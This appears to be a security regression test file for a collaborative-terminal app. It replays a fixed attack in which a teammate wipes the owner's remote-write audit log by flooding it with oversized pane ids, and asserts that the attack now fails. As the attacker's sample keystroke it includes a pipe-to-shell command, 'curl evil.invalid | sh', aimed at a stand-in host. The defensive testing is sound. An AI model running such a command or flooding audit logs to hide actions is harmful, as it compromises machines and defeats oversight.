// FIXED: a teammate on the roster could erase the owner's remote-write audit
// log. These tests are the attack, and they now assert that it fails.
//
// `KEY_GRANT_WARNING` in `src/renderer/src/dialogs/startTeamwork.ts` is the
// promise the whole "anyone on the roster can type into any pane" design rests
// on, and one of its four mitigations is:
//
//     "Every remote write is recorded on this machine, with who and when."
//
// That record is `src/main/teamwork/peer/writeLog.ts`: one JSON line per write,
// rotated once at `WRITE_LOG_MAX_BYTES` (1 MiB) with exactly one generation
// kept. Two rotations therefore discard everything that came before.
//
// The size of a line used to be unbounded by anything the attacker did not
// control. `Params.terminalWrite` was `{ terminalId: z.string().min(1), data:
// z.string() }` — `data` had `MAX_REMOTE_WRITE_BYTES` enforced against it in
// `peerTransport.judgeWrite`, and `terminalId` had no ceiling at all. A write
// naming a pane that does not exist is *still* recorded (`PeerService.#refuse`
// calls `#recordWrite`), and it was recorded with the caller's `terminalId`
// verbatim. So two `terminal.write` requests whose `terminalId` was a megabyte
// of padding rotated the log twice and everything the attacker had actually
// done was gone.
//
// Four things close it, and there is a test below for each:
//
//   * `Params.terminalWrite` caps `terminalId` at `MAX_TERMINAL_ID_CHARS`.
//   * `peerTransport.judgeWrite` caps it as well, because it runs in front of
//     the schema and in front of the verdict that does the recording.
//   * `writeLog.record` bounds the entry it files, whatever it is handed.
//   * `PeerService` never writes a caller's id down verbatim: an id that names
//     no pane of this machine is filed as a digest of itself.
//
// And a rotation that discards history now leaves a marker the owner can see,
// because a log that silently began where somebody filled it cannot be told
// from a log nothing happened in.
//
// The tests below drive `PeerService.remoteWrite`, which is precisely the
// `onRemoteWrite` verdict the peer transport calls for every teammate keystroke
// (`peerService.ts`: `onRemoteWrite: (write) => this.remoteWrite(linkId, write)`),
// with the arguments the transport builds from the wire.

import { mkdtemp, readFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { describe, expect, it } from 'vitest'
import { loadIdentity } from '../../src/main/teamwork/identity'
import { MAX_TERMINAL_ID_CHARS, Params } from '../../src/shared/methods'
import { ErrorCode } from '../../src/shared/protocol'
import { generateStaticKeyPair } from '../../src/shared/peer'
import {
  createFakeRelay,
  createManualScheduler,
  createPeerRuntime,
  fixedRemoteRunner,
  makeProjectDir,
  project,
  standingConsent,
  terminal,
  worktree,
  type PeerRuntime
} from '../../src/main/teamwork/peer/peerTestSupport'
import { linkIdFor } from '../../src/main/teamwork/peer/peerService'
import { normaliseRemote, projectKeyFor } from '../../src/main/teamwork/peer/projectKey'
import {
  createRemoteWriteLog,
  WRITE_LOG_DIR,
  WRITE_LOG_FILE,
  WRITE_LOG_MAX_BYTES,
  WRITE_LOG_MAX_ENTRY_BYTES
} from '../../src/main/teamwork/peer/writeLog'
import { ownerRig, refusalsOf, settle } from './peerRig'

const ORIGIN = 'git@example.invalid:team/repo.git'
const RELAY_URL = 'ws://relay.invalid/v1/relay'
const PROJECT_KEY = projectKeyFor(normaliseRemote(ORIGIN) as string)

type Victim = {
  alice: PeerRuntime
  /** The connection id the attacker's link answers on. */
  linkId: string
}

/**
 * Alice, with one real pane, and Mallory on her roster.
 *
 * Mallory is a legitimate member: she pushed her key to `.teamree/members/`,
 * which `docs/teamwork.md` says is the whole of membership. Nothing below
 * requires her to be anything else.
 */
async function victim(): Promise<Victim> {
  const scheduler = createManualScheduler()
  const relay = createFakeRelay()
  const mallory = Buffer.from(generateStaticKeyPair().publicKey).toString('base64')
  const aliceData = await mkdtemp(join(tmpdir(), 'teamree-sec-alice-'))
  const { publicKey: aliceKey } = await loadIdentity(aliceData)
  const projectPath = await makeProjectDir([
    { handle: 'alice', publicKey: aliceKey },
    { handle: 'mallory', publicKey: mallory }
  ])

  const alice = await createPeerRuntime({
    dial: relay.dial,
    scheduler,
    env: { TEAMREE_RELAY_URL: RELAY_URL },
    runner: fixedRemoteRunner(ORIGIN),
    dataDir: aliceData,
    // Alice has already told her machine that Mallory may type in this pane —
    // which is exactly the state the key-grant warning is about. These tests
    // are about what the record survives, not about the asking, and a
    // keystroke held for a prompt is a keystroke that never reaches the log.
    consent: standingConsent([{ terminalId: 't_a1', publicKey: mallory }]),
    workspace: {
      projects: [project('p_alice', projectPath)],
      worktrees: [worktree('wt_a1', 'p_alice', 'search ranking', 'feat/ranking')],
      terminals: [terminal('t_a1', 'wt_a1', { running: true })]
    }
  })
  await alice.service.start()
  return { alice, linkId: linkIdFor(mallory, PROJECT_KEY) }
}

describe('the remote-write audit log', () => {
  it('records a teammate’s keystrokes, as the key-grant warning promises', async () => {
    const { alice, linkId } = await victim()

    alice.service.remoteWrite(linkId, { terminalId: 't_a1', data: 'curl evil.invalid | sh\r', bytes: 23 })

    const log = await alice.service.writeLog({})
    expect(log.writes).toHaveLength(1)
    expect(log.writes[0]).toMatchObject({ handle: 'mallory', terminalId: 't_a1', outcome: 'written', returns: 1 })
  })

  it('ATTACK: two refused writes with an oversized terminalId no longer erase that record', async () => {
    const { alice, linkId } = await victim()

    // What Mallory does not want anyone to find later.
    alice.service.remoteWrite(linkId, { terminalId: 't_a1', data: 'curl evil.invalid | sh\r', bytes: 23 })
    expect((await alice.service.writeLog({})).writes).toHaveLength(1)

    // The cover-up, exactly as it was: one request one log line larger than the
    // whole rotation cap, twice, apart, so each reaches the disk on its own.
    const padding = 'A'.repeat(WRITE_LOG_MAX_BYTES + 1_000)
    alice.service.remoteWrite(linkId, { terminalId: padding, data: 'x', bytes: 1 })
    await alice.service.writeLog({})
    alice.service.remoteWrite(linkId, { terminalId: padding, data: 'x', bytes: 1 })

    const after = await alice.service.writeLog({})
    // The keystroke is still there, and so are both attempts to bury it.
    expect(after.writes.some((write) => write.terminalId === 't_a1')).toBe(true)
    expect(after.writes.filter((write) => write.outcome === 'no-pane')).toHaveLength(2)
    // Nothing rotated, so there is nothing to report.
    expect(after.problem).toBeNull()
    // And the padding never reached the owner's disk in any form.
    expect(JSON.stringify(after)).not.toContain('AAAA')
  })

  it('ATTACK: an unbounded, attacker-chosen terminalId is not written to the owner’s disk', async () => {
    const { alice, linkId } = await victim()

    // The size of what a refused write costs the owner is no longer chosen by
    // the caller. An id that names no pane of this machine is filed as a digest
    // of itself — enough for the owner to see the same made-up id come back,
    // and nothing the caller gets to choose the length of. The same string is
    // the key `PeerService.#attribute` would file a typist under, and that map
    // is not touched at all for a pane this machine does not have.
    const padding = 'B'.repeat(64 * 1024)
    alice.service.remoteWrite(linkId, { terminalId: padding, data: 'x', bytes: 1 })

    const log = await alice.service.writeLog({})
    expect(log.writes).toHaveLength(1)
    expect(log.writes[0]?.outcome).toBe('no-pane')
    expect(log.writes[0]?.terminalId).not.toContain('B')
    expect(log.writes[0]?.terminalId.length).toBeLessThanOrEqual(MAX_TERMINAL_ID_CHARS)
    // The same id twice is the same digest, so a burst of attempts at one
    // made-up pane still reads as one made-up pane.
    alice.service.remoteWrite(linkId, { terminalId: padding, data: 'x', bytes: 1 })
    const again = await alice.service.writeLog({})
    expect(again.writes[1]?.terminalId).toBe(log.writes[0]?.terminalId)

    // And a refusal never quotes what it was given back into the record.
    expect(JSON.stringify(again)).not.toContain('BBBB')
  })

  it('refuses a write whose pane id is longer than a pane id, before anything is recorded', async () => {
    // In front of the schema, because `judgeWrite` runs first, and in front of
    // the owner's verdict, because the verdict is the thing that records.
    const owner = ownerRig()
    const padding = 'C'.repeat(MAX_TERMINAL_ID_CHARS + 1)
    owner.sendRaw([JSON.stringify({ id: 'w', method: 'terminal.write', params: { terminalId: padding, data: 'x' } })])
    await settle()

    expect(refusalsOf(owner.replies())).toEqual([
      { id: 'w', code: ErrorCode.InvalidParams, message: expect.stringContaining('pane id') as unknown as string }
    ])
    // Never asked about, so never recorded, so never a line in the owner's log.
    expect(owner.judged()).toHaveLength(0)
    expect(owner.written()).toHaveLength(0)
    expect(owner.dispatched()).toBe(0)
  })

  it('refuses an oversized pane id at the schema as well, for every other way in', () => {
    const ok = Params.terminalWrite.safeParse({ terminalId: 'term_12', data: 'x' })
    expect(ok.success).toBe(true)
    const tooLong = Params.terminalWrite.safeParse({ terminalId: 'C'.repeat(MAX_TERMINAL_ID_CHARS + 1), data: 'x' })
    expect(tooLong.success).toBe(false)
  })

  it('bounds one entry, so no single write can rotate the log by itself', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'teamree-sec-entry-'))
    const log = createRemoteWriteLog({ dataDir: dir })
    log.record({
      at: 1,
      handle: 'D'.repeat(10_000),
      publicKey: 'E'.repeat(10_000),
      projectId: 'F'.repeat(10_000),
      terminalId: 'G'.repeat(WRITE_LOG_MAX_BYTES),
      bytes: 1,
      returns: 0,
      outcome: 'no-pane',
      reason: 'H'.repeat(10_000)
    })
    await log.flush()

    const raw = await readFile(join(dir, WRITE_LOG_DIR, WRITE_LOG_FILE), 'utf8')
    for (const line of raw.split('\n')) {
      expect(Buffer.byteLength(line, 'utf8')).toBeLessThanOrEqual(WRITE_LOG_MAX_ENTRY_BYTES)
    }
    // Truncated rather than dropped: a write nothing recorded is worse than a
    // write recorded with a cut-down pane id.
    const [entry] = (await log.read()).writes
    expect(entry?.outcome).toBe('no-pane')
    expect(entry?.bytes).toBe(1)
  })

  it('says so when a rotation discards history, rather than beginning again in silence', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'teamree-sec-rotate-'))
    // Small enough that a handful of ordinary entries crosses it.
    const log = createRemoteWriteLog({ dataDir: dir, maxBytes: 400 })
    for (let index = 0; index < 20; index += 1) {
      log.record({
        at: index,
        handle: 'mallory',
        publicKey: 'k',
        projectId: 'p_alice',
        terminalId: 't_a1',
        bytes: 1,
        returns: 0,
        outcome: 'written'
      })
      await log.flush()
    }

    const read = await log.read()
    // The newest is still there, the oldest is gone, and the owner is told that
    // it is: an audit trail that lost part of itself in silence is worse than
    // one that says where the hole is.
    expect(read.writes[read.writes.length - 1]?.at).toBe(19)
    expect(read.writes.length).toBeLessThan(20)
    expect(read.problem).toContain('discarded')
  })
})
